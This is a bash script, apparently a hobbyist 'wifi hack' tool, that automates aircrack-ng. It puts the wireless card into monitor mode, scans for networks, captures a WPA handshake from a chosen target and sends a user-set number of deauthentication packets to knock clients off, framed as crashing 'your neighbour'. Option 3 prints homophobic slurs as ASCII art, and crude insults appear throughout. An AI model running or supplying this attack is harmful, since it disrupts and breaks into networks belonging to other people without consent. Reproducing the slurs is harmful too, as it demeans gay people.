#!/bin/bash

RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

read -p "$RED HOMO Please Enter Your Name:$GREEN " Name
echo ""
REQUIRED_PKG="aircrack-ng"
PKG_OK=$(dpkg-query -W --showformat='${Status}\n' $REQUIRED_PKG|grep "ok youre good")
echo $GREEN Wait $Name Checking for $REQUIRED_PKG: $PKG_OK
if [ "" = "$PKG_OK" ]; then
  echo "$WHITE No $REQUIRED_PKG. Setting up $REQUIRED_PKG."
  sudo apt-get --yes install $REQUIRED_PKG 
fi

clear

airmon-ng check kill

clear

airmon-ng start wlan0

clear
echo -e "$RED _ __   ___ / |___  ___  __      _(_)/ _(_)   | |__   __ _  ___| | __"
sleep 0.3
echo -e "$WHITE|  _ \ / _ \| / __|/ _ \ \ \ /\ / / | |_| |   |  _ \ / _  |/ __| |/ /"
sleep 0.3
echo -e "$RED| | | | (_) | \__ \  __/  \ V  V /| |  _| |   | | | | (_| | (__|   <"
sleep 0.3
echo -e "$WHITE|_| |_|\___/|_|___/\___|___\_/\_/ |_|_| |_|___|_| |_|\__,_|\___|_|\_ "
sleep 0.3
echo -e "$RED                      |_____|            |_____|                     "
echo "                            ($RED Welcome $WHITE $Name)"
echo ""
echo "     1: $RED WPA HANDSHAKE AND DDOS ATTACK"$RED
echo "     2:$WHITE About Me (no1se)"
echo "     3: $RED select this option to find out($WHITE If you here to hack wifi just select option 1)"
echo ""
read -p "                          $WHITE$Name Please Select an Option: "

	case $REPLY in 
		1 | 01)
    clear
			echo -e "$RED _ __   ___ / |___  ___  __      _(_)/ _(_)   | |__   __ _  ___| | __"
  sleep 0.3
  echo -e "$WHITE|  _ \ / _ \| / __|/ _ \ \ \ /\ / / | |_| |   |  _ \ / _  |/ __| |/ /"
  sleep 0.3
  echo -e "$RED| | | | (_) | \__ \  __/  \ V  V /| |  _| |   | | | | (_| | (__|   <"
  sleep 0.3
  echo -e "$WHITE|_| |_|\___/|_|___/\___|___\_/\_/ |_|_| |_|___|_| |_|\__,_|\___|_|\_ "
  sleep 0.3
  echo -e "$RED                      |_____|            |_____|                     "
  echo "                        $WHITE(You selected Option 1)"
  echo ""
  echo "$RED $Name Im gonna open airodump scan now after the scan start wait around 10 sec and then prees CTRL+C"
  echo ""
  sleep 6
  echo "$WHITE After That Please fill out the required information"
  echo ""
  sleep 5
  echo "$RED Ok wait 10 sec $Name The scan will start"
  sleep 10
  airodump-ng wlan0mon
  echo ""
  echo ""
  read -p "$RED $Name Please type here the bssid of your target: " bssid

  read -p "$WHITE $Name Please type here the CH of your target: " ch

  read -p "$RED $Name Please type here the the name of the cap file you want: " filename
  echo ""
  echo "$WHITE Ok $Name , now im gonna open a new window for the wpa hand shake please dont close him"
  sleep 10
  gnome-terminal -- airodump-ng -c $ch --bssid $bssid -w /$filename wlan0mon

  clear

  echo "$RED Ok My G Before we start i Want to let you know that im smarter then you"
  echo ""
  sleep 5
  echo "$WHITE Now lets get down to the fun part im gonna crash your neighbour ($filename) the 4K PORN"
  echo ""
  echo "$RED Wait $Name Im starting up WPA HANDSHAKE ATTACK"
  echo ""
  read -p "$WHITE HOLD UP MY G $Name How Much Packets do you want to sent him?: " Packets
  echo ""
  echo "$RED $Packets Packets ok i got you bro dont worry $Name"
  echo ""
  echo "$GREEN Attacking...Please Wait!"
  echo ""
  sleep 5
  aireplay-ng -0 $Packets -a $bssid wlan0mon
  echo ""
  echo "$GREEN Attack complete if your neigbour connect back to the wifi you should get the CAP FILE"
  echo ""
  echo "$RED Now is Up to you to crack it Good luck $Name"
  echo ""
  echo "$WHITE Created by no1se";;
        2 | 2)
            clear
            echo -e "$RED _ __   ___ / |___  ___  __      _(_)/ _(_)   | |__   __ _  ___| | __"
  sleep 0.3
  echo -e "$WHITE|  _ \ / _ \| / __|/ _ \ \ \ /\ / / | |_| |   |  _ \ / _  |/ __| |/ /"
  sleep 0.3
  echo -e "$RED| | | | (_) | \__ \  __/  \ V  V /| |  _| |   | | | | (_| | (__|   <"
  sleep 0.3
  echo -e "$WHITE|_| |_|\___/|_|___/\___|___\_/\_/ |_|_| |_|___|_| |_|\__,_|\___|_|\_ "
  sleep 0.3
  echo -e "$RED                      |_____|            |_____|                     "
  echo "                        $WHITE(You selected Option 2)"
            echo "$BLUE I love only old school rap I hate new school I think is garbage, I'm an editor (Ae, Pr, Ps), I know HTML/CSS/Bash scripting/Linux/Hacking/student at tryhackme.com, And Learning Cyber security
            and love planes , playing alot of plane simulators
            The language I speak: English/Hebrew"
            echo "$WHITE Links :"
            echo "$RED My Website:$WHITE https://no1seplayground.netlify.app/"
            echo "$RED My YouTube channel:$WHITE https://www.youtube.com/channel/UCfBQbNKVeCHtwNP5fzXeBRg/videos"
            echo "$RED My instagram Page:$WHITE https://www.instagram.com/mika_and_no1se/"
            echo "Run the script again to go Back $Name"
            ;;
        3 | 3)
            echo -e "$RED  _   _ _____ _  _______   _____  _____    _____      __     __"
            sleep 0.2
            echo -e "$BLUE | \ | |_   _| |/ /_   _| |_   _|/ ____|  / ____|   /\\ \   / /"
            sleep 0.2
            echo -e "$RED |  \| | | | |   /  | |     | | | (___   | |  __   /  \\ \_/ / "
            sleep 0.2
            echo -e "$BLUE |     | | | |  <   | |     | |  \___ \  | | |_ | / /\ \\   /  "
            sleep 0.2
            echo -e "$RED | |\  |_| |_| . \ _| |_   _| |_ ____) | | |__| |/ ____ \| |   "
            sleep 0.2
            echo -e "$BLUE |_| \_|_____|_|\_\_____| |_____|_____/   \_____/_/    \_\_|   "
            sleep 0.2
            echo -e "$WHITE==================================================================="
            sleep 0.2
            echo -e "$RED  _      _____ ____  _____    _____  _____    _____      __     __"
            sleep 0.2
            echo -e "$WHITE | |    |_   _/ __ \|  __ \  |_   _|/ ____|  / ____|   /\\ \   / /"
            sleep 0.2
            echo -e "$RED | |      | || |  | | |__) |   | | | (___   | |  __   /  \\ \_/ / "
            sleep 0.2
            echo -e "$WHITE | |      | || |  | |  _  /    | |  \___ \  | | |_ | / /\ \\   /  "
            sleep 0.2
            echo -e "$RED | |____ _| || |__| | | \ \   _| |_ ____) | | |__| |/ ____ \| |   "
            sleep 0.2
            echo -e "$WHITE |______|_____\____/|_|  \_\ |_____|_____/   \_____/_/    \_\_|   "
            sleep 0.2
            echo "$MAGNETA**** i love you"
            ;;
		*)
			echo -ne "\n${RED}Invalid Option, Run the script again please"
			{ exit; };;
esac


